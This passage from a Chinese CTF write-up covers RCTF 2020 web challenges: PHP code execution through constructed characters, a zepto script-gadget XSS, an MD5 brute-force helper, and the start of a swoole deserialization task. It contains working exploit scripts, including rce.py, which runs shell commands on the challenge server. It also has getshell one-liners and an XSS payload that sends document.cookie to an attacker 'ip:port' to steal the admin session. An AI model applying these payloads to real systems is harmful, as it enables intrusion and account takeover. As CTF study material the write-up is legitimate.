<p>这里记录下<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvT3Y1UFhvaC1nSFlZck9DQTlUTldHdw==">@星盟<i class="fa fa-external-link-alt"></i></span>构造出来的几个字母</p>
<p>因为php中<br>$$<br>\frac{0}{0}=NAN<br>$$</p>
<p>$$<br>\frac{1}{0}=INF<br>$$</p>
<p>所以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((0&#x2F;0).(0))&#123;0&#125; &#x3D;&gt; N</span><br><span class="line">((0&#x2F;0).(0))&#123;1&#125; &#x3D;&gt; A</span><br><span class="line">((1&#x2F;0).(0))&#123;0&#125; &#x3D;&gt; I</span><br><span class="line">((1&#x2F;0).(0))&#123;2&#125; &#x3D;&gt; F</span><br></pre></td></tr></table></figure>
</blockquote>
<p>暴力枚举一下</p>
<p><code>make.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">table = list(<span class="string">b'0123456789.-E'</span>)  <span class="comment"># 已知可构造字符</span></span><br><span class="line">di = &#123;&#125;</span><br><span class="line">l = len(table)</span><br><span class="line">temp = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> temp != l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(temp, l):</span><br><span class="line">        <span class="keyword">if</span> ~table[j] &amp; <span class="number">0xff</span> <span class="keyword">not</span> <span class="keyword">in</span> table:  <span class="comment"># 非运算</span></span><br><span class="line">            table.append(~table[j] &amp; <span class="number">0xff</span>)</span><br><span class="line">            di[~table[j] &amp; <span class="number">0xff</span>] = &#123;<span class="string">'op'</span>: <span class="string">'~'</span>, <span class="string">'c'</span>: table[j]&#125;  <span class="comment"># 加入字典</span></span><br><span class="line">            <span class="comment"># print(f'~ &#123;str(bytes([table[j]]))[1:]&#125; = &#123;str(bytes([~table[j]&amp;0xff]))[1:]&#125;')  # 打印构造过程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(max(i+<span class="number">1</span>, temp), l):</span><br><span class="line">            t = table[i] &amp; table[j]  <span class="comment"># 与运算</span></span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                di[t] = &#123;<span class="string">'op'</span>: <span class="string">'&amp;'</span>, <span class="string">'c1'</span>: table[i], <span class="string">'c2'</span>: table[j]&#125;  <span class="comment"># 加入字典</span></span><br><span class="line">                <span class="comment"># print(f'&#123;str(bytes([table[i]]))[1:]&#125; &amp; &#123;str(bytes([table[j]]))[1:]&#125; = &#123;str(bytes([t]))[1:]&#125;')  # 打印构造过程</span></span><br><span class="line">            t = table[i] | table[j]  <span class="comment"># 或运算</span></span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">not</span> <span class="keyword">in</span> table:</span><br><span class="line">                table.append(t)</span><br><span class="line">                di[t] = &#123;<span class="string">'op'</span>: <span class="string">'|'</span>, <span class="string">'c1'</span>: table[i], <span class="string">'c2'</span>: table[j]&#125;  <span class="comment"># 加入字典</span></span><br><span class="line">                <span class="comment"># print(f'&#123;str(bytes([table[i]]))[1:]&#125; | &#123;str(bytes([table[j]]))[1:]&#125; = &#123;str(bytes([t]))[1:]&#125;')  # 打印构造过程</span></span><br><span class="line">    temp = l</span><br><span class="line">    l = len(table)</span><br><span class="line"></span><br><span class="line">table.sort()</span><br><span class="line">print(bytes(table))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">可构造出:</span></span><br><span class="line"><span class="string">\t\n\r !"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">howmake</span><span class="params">(ch: int)</span> -&gt; str:</span></span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> <span class="string">b'0123456789'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).('</span> + chr(ch) + <span class="string">'))&#123;1&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.1))&#123;2&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'-'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(-1))&#123;1&#125;)'</span></span><br><span class="line">    <span class="keyword">elif</span> ch <span class="keyword">in</span> <span class="string">b'E'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(((1).(0.00001))&#123;4&#125;)'</span></span><br><span class="line">    d = di.get(ch)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        op = d.get(<span class="string">'op'</span>)</span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">'~'</span>:</span><br><span class="line">            c = <span class="string">'~'</span>+howmake(d.get(<span class="string">'c'</span>))</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'&amp;'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'&amp;'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="string">'|'</span>:</span><br><span class="line">            c = howmake(d.get(<span class="string">'c1'</span>)) + <span class="string">'|'</span> + howmake(d.get(<span class="string">'c2'</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f'(<span class="subst">&#123;c&#125;</span>)'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'input error!'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = input(<span class="string">'&gt;'</span>)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">            result.append(howmake(ord(i)))</span><br><span class="line">        result = <span class="string">'.'</span>.join(result)</span><br><span class="line">        print(<span class="string">f'(<span class="subst">&#123;result&#125;</span>)'</span>)</span><br></pre></td></tr></table></figure>

<p>但是这样执行有很大的限制，只能运行单行命令，而且url有长度限制</p>
<p>经过月亮大哥<code>@cjM00n</code>的提醒，可以将shell分为多段，写到文件中再执行</p>
<p>然后根据写出如下脚本</p>
<p><code>rce.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> make <span class="keyword">import</span> howmake</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'system'</span>:</span><br><span class="line">    system.append(howmake(ord(i)))</span><br><span class="line">system = quote(<span class="string">'.'</span>.join(system))</span><br><span class="line"><span class="comment">#url = 'http://192.168.127.130/calc.php?num='</span></span><br><span class="line">url = <span class="string">'http://124.156.140.90:8081/calc.php?num='</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rce</span><span class="params">(payload: str)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">        result.append(howmake(ord(i)))</span><br><span class="line">    result = quote(<span class="string">'.'</span>.join(result))</span><br><span class="line">    payload = <span class="string">f'(<span class="subst">&#123;system&#125;</span>)(<span class="subst">&#123;result&#125;</span>)'</span></span><br><span class="line">    <span class="comment"># print(f'payload:\n(&#123;payload&#125;)')</span></span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Input your shellcode, press "e" to over and run.'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        cmd = <span class="string">''</span></span><br><span class="line">        temp = input(<span class="string">f'line <span class="subst">&#123;i&#125;</span> &gt;'</span>)</span><br><span class="line">        <span class="keyword">while</span> temp.lower() != <span class="string">'e'</span>:</span><br><span class="line">            cmd += temp.strip() + <span class="string">'\n'</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            temp = input(<span class="string">f'line <span class="subst">&#123;i&#125;</span> &gt;'</span>)</span><br><span class="line">        print(<span class="string">'writing shellcode to /tmp/c.sh'</span>)</span><br><span class="line">        print(<span class="string">'====================================================='</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(cmd), <span class="number">10</span>):</span><br><span class="line">            payload = cmd[i:i+<span class="number">10</span>]</span><br><span class="line">            print(<span class="string">f'<span class="subst">&#123;payload&#125;</span>'</span>,end=<span class="string">''</span>)</span><br><span class="line"><span class="comment">#           payload = "echo '" + payload + "\\'&gt;&gt;/tmp/c.sh"</span></span><br><span class="line">            payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            payload = <span class="string">f'echo <span class="subst">&#123;payload&#125;</span>|base64 -d&gt;&gt;/tmp/c.sh'</span></span><br><span class="line">            rce(payload)</span><br><span class="line">        print(<span class="string">'====================================================='</span>)</span><br><span class="line">        payload = <span class="string">'/bin/bash /tmp/c.sh'</span></span><br><span class="line">        print(<span class="string">f'[+]<span class="subst">&#123;payload&#125;</span>'</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">'====================================================='</span>)</span><br><span class="line">        print(rce(payload))</span><br><span class="line">        print(<span class="string">'====================================================='</span>)</span><br><span class="line">        print()</span><br><span class="line">        payload = <span class="string">'rm -rf /tmp/c.sh'</span></span><br><span class="line">        print(<span class="string">f'[+]<span class="subst">&#123;payload&#125;</span>'</span>)</span><br><span class="line">        rce(payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">https://github.com/ZeddYu/ReadFlag/blob/master/bash.md</span></span><br><span class="line"><span class="string">执行下面代码就能拿到flag</span></span><br><span class="line"><span class="string">rm -rf /tmp/pipe</span></span><br><span class="line"><span class="string">mkfifo /tmp/pipe</span></span><br><span class="line"><span class="string">cat /tmp/pipe | /readflag |(read l;read l;echo "$(($l))" &gt; /tmp/pipe;cat)</span></span><br><span class="line"><span class="string">rm -rf /tmp/pipe</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/06/01/6ouhMIWl1VECiR4.png" alt="image-20200601092657864.png"></p>
<p>这里还有别的方法可以getshell</p>
<blockquote>
<p>system(end(getallheaders()));</p>
<p>system(file_get_contents(“php://input”));</p>
</blockquote>
<h3 id="EasyBlog"><a href="#EasyBlog" class="headerlink" title="EasyBlog"></a>EasyBlog</h3><p>赛后根据月亮大哥<span class="exturl" data-url="aHR0cHM6Ly9jam0wMG4udG9wL0NURi9yY3RmLTIwMjAtd3AuaHRtbCNFYXN5QmxvZw==">@cjM00n<i class="fa fa-external-link-alt"></i></span>的思路来复现一下</p>
<p>比赛中修改了题目的CSP</p>
<p>改后如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;none&#39;; script-src &#39;unsafe-eval&#39; &#39;nonce-4dd516bfb85e09859190085f3abc31d8439fe768&#39; ; font-src &#39;self&#39; data:; connect-src &#39;self&#39;; img-src *; style-src &#39;self&#39;; base-uri &#39;none&#39;</span><br></pre></td></tr></table></figure>

<p>比改之前多了个<code>unsafe-eval</code></p>
<p><code>hint: zepto</code></p>
<p>入口 <span class="exturl" data-url="aHR0cDovLzEyNC4xNTYuMTM0LjkyOjgwODEvP3BhZ2U9bG9naW4=">http://124.156.134.92:8081/?page=login<i class="fa fa-external-link-alt"></i></span></p>
<p>打开之后是一个登录</p>
<p>观察url很容易找到注册入口 <span class="exturl" data-url="aHR0cDovLzEyNC4xNTYuMTM0LjkyOjgwODEvP3BhZ2U9cmVnaXN0ZXI=">http://124.156.134.92:8081/?page=register<i class="fa fa-external-link-alt"></i></span></p>
<p>随意注册一个账号进去之后发现 <code>Report</code></p>
<p><img src="https://i.loli.net/2020/06/02/FvE1wnNDzGeVP8t.png" alt="image.png"></p>
<p>很显然这是个<strong>XSS</strong>题</p>
<p>根据CSP，我们构造一个payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123&lt;img src&#x3D;1&gt;123</span><br></pre></td></tr></table></figure>

<p>然后见框就插</p>
<p><img src="https://i.loli.net/2020/06/02/YD6rKJ7z3ERucdC.png" alt="YD6rKJ7z3ERucdC.png"></p>
<p>可以看到有两个地方解析了，分别是</p>
<ul>
<li>article的content</li>
<li>comment的content</li>
</ul>
<p>题目提示 <code>zepto</code></p>
<p>所以我们看看js的部分</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addComments</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  comments.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">comment</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> html = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;div class="panel panel-default"&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string">          &lt;span class="name"&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string">          &lt;div class="pull-right"&gt;</span></span><br><span class="line"><span class="string">              &lt;button type="button" class="btn btn-default btn-xs like" data-id="<span class="subst">$&#123;comment.id&#125;</span>"&gt;</span></span><br><span class="line"><span class="string">                &lt;span class="glyphicon glyphicon-thumbs-up" aria-hidden="true"&gt;&lt;/span&gt;&lt;span&gt;<span class="subst">$&#123;comment.like&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">              &lt;/button&gt;</span></span><br><span class="line"><span class="string">              &lt;button type="button" class="btn btn-default btn-xs dislike" data-id="<span class="subst">$&#123;comment.id&#125;</span>"&gt;</span></span><br><span class="line"><span class="string">                &lt;span class="glyphicon glyphicon-thumbs-down" aria-hidden="true"&gt;&lt;/span&gt;&lt;span&gt;<span class="subst">$&#123;comment.dislike&#125;</span>&lt;/span&gt;</span></span><br><span class="line"><span class="string">              &lt;/button&gt;</span></span><br><span class="line"><span class="string">          &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class="panel-body"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    dom = $(html)</span><br><span class="line">    dom.find(<span class="string">'div&gt;.name'</span>).text(comment.name)</span><br><span class="line">    dom.find(<span class="string">'.panel-body'</span>).html(comment.comment)</span><br><span class="line">    $(<span class="string">'#comments'</span>).append(dom)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlParam</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^|&amp;)"</span> + name + <span class="string">"=([^&amp;]*)(&amp;|$)"</span>)</span><br><span class="line">  <span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(reg)</span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>])</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$.<span class="keyword">get</span>('?page=comments&amp;cb=addComments&amp;id=' + getUrlParam('id'))</span><br><span class="line">$('#comments').on('click','button', function(e) &#123;</span><br><span class="line">  <span class="keyword">let</span> btn = $(e.currentTarget)</span><br><span class="line">  <span class="keyword">if</span> (btn.hasClass(<span class="string">'like'</span>)) &#123;</span><br><span class="line">    $.<span class="keyword">get</span>('?page=vote&amp;op=like&amp;id=' + btn.data('id'), function(e) &#123;</span><br><span class="line">      <span class="keyword">let</span> count = <span class="built_in">parseInt</span>(btn.children(<span class="string">'span:last-child'</span>).text())</span><br><span class="line">      btn.children(<span class="string">'span:last-child'</span>).text(count + <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(btn.hasClass(<span class="string">'dislike'</span>)) &#123;</span><br><span class="line">    $.<span class="keyword">get</span>('?page=vote&amp;op=dislike&amp;id=' + btn.data('id'), function(e) &#123;</span><br><span class="line">      <span class="keyword">let</span> count = <span class="built_in">parseInt</span>(btn.children(<span class="string">'span:last-child'</span>).text())</span><br><span class="line">      btn.children(<span class="string">'span:last-child'</span>).text(count + <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里使用的不是 <code>jquery</code> 而是 <code>zepto</code></p>
<p>这道题我只看出了一个可疑的地方</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dom.find(<span class="string">'.panel-body'</span>).html(comment.comment)</span><br></pre></td></tr></table></figure>

<p>然后月亮大哥说还有个可控jsonp，可以通过改变cb的值来控制输出，但是由于我们缺少<code>unsafe-inline</code>, 不能在页面中插入<code>script</code>标签, 这样就无法调用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.<span class="keyword">get</span>('?page=comments&amp;cb=addComments&amp;id=' + getUrlParam('id'))</span><br></pre></td></tr></table></figure>

<p>找到问题所在就去看文档 <span class="exturl" data-url="aHR0cHM6Ly96ZXB0b2pzLmNvbS8jaHRtbA==">https://zeptojs.com/#html<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/06/02/dQlvFrjgz3eC5JV.png" alt="image.png"></p>
<p>简单地说就是 <code>innerHTML</code> 的效果</p>
<p>但是同样因为没有 <code>unsafe-inline</code> 也无法利用</p>
<p>然后看@zeddyu师傅的blog找到思路<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnplZGR5dS5pbmZvLzIwMTkvMDMvMTQvV2Vi5a6J5YWo5LuO6Zu25byA5aeLLVhTUy1JSUkvI+S7o+eggemHjeeUqA==">Web安全从零开始-XSS-III<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://i.loli.net/2020/06/02/9mXry6GtM1KAJZv.png" alt="image.png"></p>
<p>（贴上月亮大哥的知识点 ：<span class="exturl" data-url="aHR0cHM6Ly9jam0wMG4udG9wL0NURi9yY3RmLTIwMjAtd3AuaHRtbCNTY3JpcHQtR2FkZ2V0cw==">Script-Gadgets<i class="fa fa-external-link-alt"></i></span></p>
<p>考虑到有代码重用的可能性，针对<code>zepto</code>进行代码审计，因为有<code>unsafe-eval</code>，所以我们使用<code>eval</code>关键字进行查找</p>
<p>然后库中 <code>src/zepto.js</code> 发现了点东西</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">nodes.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (copyByClone) node = node.cloneNode(<span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!parent) <span class="keyword">return</span> $(node).remove()</span><br><span class="line"></span><br><span class="line">  parent.insertBefore(node, target)</span><br><span class="line">  <span class="keyword">if</span> (parentInDocument) traverseNode(node, <span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (el.nodeName != <span class="literal">null</span> &amp;&amp; el.nodeName.toUpperCase() === <span class="string">'SCRIPT'</span> &amp;&amp;</span><br><span class="line">       (!el.type || el.type === <span class="string">'text/javascript'</span>) &amp;&amp; !el.src)&#123;</span><br><span class="line">      <span class="keyword">var</span> target = el.ownerDocument ? el.ownerDocument.defaultView : <span class="built_in">window</span></span><br><span class="line">      target[<span class="string">'eval'</span>].call(target, el.innerHTML)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这里的<code>toUpperCase()</code>就可以操作了</p>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vSFRNTC9qYXZhc2NyaXB0LXVwLWxvdy1lcmNhc2UtdGlwLmh0bWw=">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>所以我们可以通过 <code>scrıpt</code> 来绕过检测，让zepto来执行</p>
<p>测试一下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scrıpt&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/scrıpt&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以弹窗</p>
<p>接着我们新建一个article</p>
<p>插入comment</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scrıpt&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;+btoa(document.cookie)&lt;&#x2F;scrıpt&gt;</span><br></pre></td></tr></table></figure>

<p>然后本地运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server port</span><br></pre></td></tr></table></figure>

<p>然后提交到Report得到cookies</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHPSESSID&#x3D;1e251d73b669a63e8ca8fca7eb9b915b</span><br></pre></td></tr></table></figure>

<p>以管理员身份进入之后就得到flag了</p>
<blockquote>
<p>RCTF{1s_This_4_feaTur3_0R_A_bUg!}</p>
</blockquote>
<blockquote>
<p>附MD5截断比较脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size)).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">        md5 = hashlib.md5(rnds + <span class="string">b'AFRzSApjjP'</span>) <span class="comment"># 这里自己改</span></span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            print(rnds.decode(<span class="string">'utf-8'</span>))</span><br><span class="line">            stop_event.set()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#substr = sys.argv[1].strip()</span></span><br><span class="line">    substr = <span class="string">'eafc5'</span>                            <span class="comment"># 这里自己改</span></span><br><span class="line">    <span class="comment">#start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 0</span></span><br><span class="line">    start_pos = <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"><span class="comment">#python submd5.py substr startpos</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这题@W&amp;M有另一种做法，具体可以看<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJeE1EWXlOVGszTnc9PSZtaWQ9MjI0NzQ4NDgyNSZpZHg9MSZzbj1mZmJiMTZlZTRhOTNjZGMzNjZkMDBiYjQ1NzZjYTdlZSZjaGtzbT05NzYwZjE0ZmEwMTc3ODU5ZjViNzg2ODU5MTdmMzUwMGZlOWEyODE2ZDU3MWI2YTcwOWM4ZjE4MTRjODExMTQ5YTkzZDFlZGZlNWRhJm1wc2hhcmU9MSZzY2VuZT0yMyZzcmNpZD0mc2hhcmVyX3NoYXJldGltZT0xNTkxMTE0Mzc2NjUwJnNoYXJlcl9zaGFyZWlkPTU5MWJkMTdkOWZmMGNmYTBmMDA5OWJmZTljNjAwOWQ1JmtleT1lNGZjNWQyNWUyYjkyN2NhZTQ3NmY4MWUyMTc1ZTAwMzBjNGIwZmZkZGIwYTdiMDdiZjdlZjExODIyNzhhNzE5YzhiMTk0YTUxY2Q1ZWJlNGRjNTFmNDFhODEzNWQ2NWI5YzM3M2JiMDZmZDk1OTBmYjFjYmJmMzZiMTU0NThkNmZhNTM0YjMzMzU2NTI2ZjEwZTM3NWE1YTU1YTY1Y2QyJmFzY2VuZT0xJnVpbj1PVEUxTURNNU9URXomZGV2aWNldHlwZT1XaW5kb3dzKzEwK3g2NCZ2ZXJzaW9uPTYyMDkwMDcwJmxhbmc9emhfQ04mZXhwb3J0a2V5PUFXN1UwTTFKd2szUTRaNVZPVldpQjV3JTNEJnBhc3NfdGlja2V0PVQ4N08lMkJhR3czSUg2YkxBbDRXcDYzWnlicmJ3SGxHRThWYTAyd0ZLeWJWWUZ1NFV2MFRrVGRFT2RXSWlPZU4xTg==">他们的wp<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="swoole"><a href="#swoole" class="headerlink" title="swoole"></a>swoole</h3><p><span class="exturl" data-url="aHR0cHM6Ly9zd29vbGUucmN0ZjIwMjAucm9pcy5pbw==">https://swoole.rctf2020.rois.io<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>hint1: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3b29sZS9saWJyYXJ5L2lzc3Vlcy8zNA==">https://github.com/swoole/library/issues/34<i class="fa fa-external-link-alt"></i></span> this might helpful</p>
</blockquote>
<p>先贴个出题人的writeup <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pzeHNvZnQvbXktY3RmLWNoYWxsZW5nZXMvYmxvYi9tYXN0ZXIvcmN0ZjIwMjAvc3dvb2xlL1JFQURNRV9jbi5tZA==">https://github.com/zsxsoft/my-ctf-challenges/blob/master/rctf2020/swoole/README_cn.md<i class="fa fa-external-link-alt"></i></span></p>
<p>出题人说这题是道<strong>简单</strong>的<strong>反序列化</strong></p>
<p>我：？？？</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Swoole\Runtime::enableCoroutine($flags = SWOOLE_HOOK_ALL);</span><br><span class="line">$http = <span class="keyword">new</span> Swoole\Http\Server(<span class="string">"0.0.0.0"</span>, <span class="number">9501</span>);</span><br><span class="line">$http-&gt;on(<span class="string">"request"</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">(Swoole\Http\Request $request, Swoole\Http\Response $response)</span> </span>&#123;</span><br><span class="line">        Swoole\Runtime::enableCoroutine();</span><br><span class="line">        $response-&gt;header(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line">        <span class="comment">// $response-&gt;sendfile('/flag');</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($request-&gt;get[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">            <span class="comment">// Prevent racing condition</span></span><br><span class="line">            <span class="comment">// ob_start();phpinfo();</span></span><br><span class="line">            <span class="comment">// return $response-&gt;end(ob_get_clean());</span></span><br><span class="line">            <span class="keyword">return</span> $response-&gt;sendfile(<span class="string">'phpinfo.txt'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($request-&gt;get[<span class="string">'code'</span>])) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $code = $request-&gt;get[<span class="string">'code'</span>];</span><br><span class="line">                <span class="keyword">if</span> (!preg_match(<span class="string">'/\x00/'</span>, $code)) &#123;</span><br><span class="line">                    $a = unserialize($code);</span><br><span class="line">                    $a();</span><br><span class="line">                    $a = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span 